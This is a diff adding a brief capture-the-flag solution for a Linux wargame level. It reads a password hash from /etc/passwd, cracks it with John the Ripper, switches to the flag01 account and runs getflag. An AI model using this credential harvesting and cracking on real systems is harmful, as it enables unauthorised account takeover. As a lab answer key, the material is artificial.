@@ -1,0 +1,11 @@
+LEVEL01:
+find / -name "pass*" -print 2>/dev/null
+cat /etc/passwd -> lag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
+
+	sudo install john
+	echo 42hDRfypTqqnw > pass
+	john pass
+	john --show pass -> abcdefg
+
+su flag01 -> abcdefg
+getflag
